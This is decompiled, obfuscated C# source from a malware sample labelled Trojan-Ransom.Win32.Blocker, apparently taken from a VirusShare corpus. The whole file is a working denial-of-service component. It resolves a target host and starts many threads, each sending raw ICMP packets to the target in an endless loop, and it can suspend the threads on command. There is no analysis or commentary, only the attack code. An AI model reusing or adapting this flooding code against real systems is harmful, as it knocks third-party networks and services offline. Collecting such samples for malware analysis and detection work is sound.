// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2EAA04FB-4A12-46FB-89C9-8F20DEF80030
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.heqk-a676fa6fd1e5c420949ebe87d886c57cc8693a1c182562bacd2c8a70cf0dc574.exe

using \u0005;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0005
{
  internal class \u000E
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0002;
    public static string \u0003;
    public static int \u0004;
    private static IPEndPoint \u0005;
    public static ushort \u0006;
    public static int \u0007;
    private static \u000E.\u000F[] \u0008;
    public static int \u000E;

    public static void \u008A()
    {
      try
      {
        \u000E.\u0005 = new IPEndPoint(Dns.GetHostEntry(\u000E.\u0003).AddressList[0], (int) \u000E.\u0006);
      }
      catch
      {
        \u000E.\u0005 = new IPEndPoint(IPAddress.Parse(\u000E.\u0003), (int) \u000E.\u0006);
      }
      \u000E.\u0002 = new Thread[\u000E.\u000E];
      \u000E.\u0001 = new ThreadStart[\u000E.\u000E];
      \u000E.\u0008 = new \u000E.\u000F[\u000E.\u000E];
      for (int index = 0; index < \u000E.\u000E; ++index)
      {
        \u000E.\u0008[index] = new \u000E.\u000F(\u000E.\u0005, \u000E.\u0004, \u000E.\u0007);
        \u000E.\u0001[index] = new ThreadStart(\u000E.\u0008[index].\u008C);
        \u000E.\u0002[index] = new Thread(\u000E.\u0001[index]);
        \u000E.\u0002[index].Start();
      }
    }

    public static void \u008B()
    {
      for (int index = 0; index < \u000E.\u000E; ++index)
      {
        try
        {
          \u000E.\u0002[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private class \u000F
    {
      private int \u0001;
      private IPEndPoint \u0002;
      private int \u0003;
      private Socket[] \u0004;

      public \u000F([In] IPEndPoint obj0, [In] int obj1, [In] int obj2)
      {
        this.\u0002 = obj0;
        this.\u0001 = obj1;
        this.\u0003 = obj2;
      }

      public void \u008C()
      {
        while (true)
        {
          byte[] buffer = new byte[this.\u0003];
          try
          {
            this.\u0004 = new Socket[this.\u0001];
            for (int index = 0; index < this.\u0001; ++index)
            {
              this.\u0004[index] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
              this.\u0004[index].Blocking = false;
              this.\u0004[index].SendTo(buffer, (EndPoint) this.\u0002);
            }
            Thread.Sleep(100);
            for (int index = 0; index < this.\u0001; ++index)
            {
              if (this.\u0004[index].Connected)
                this.\u0004[index].Disconnect(false);
              this.\u0004[index].Close();
              this.\u0004[index] = (Socket) null;
            }
            this.\u0004 = (Socket[]) null;
          }
          catch
          {
            for (int index = 0; index < this.\u0001; ++index)
            {
              try
              {
                if (this.\u0004[index].Connected)
                  this.\u0004[index].Disconnect(false);
                this.\u0004[index].Close();
                this.\u0004[index] = (Socket) null;
              }
              catch
              {
              }
            }
          }
        }
      }
    }
  }
}
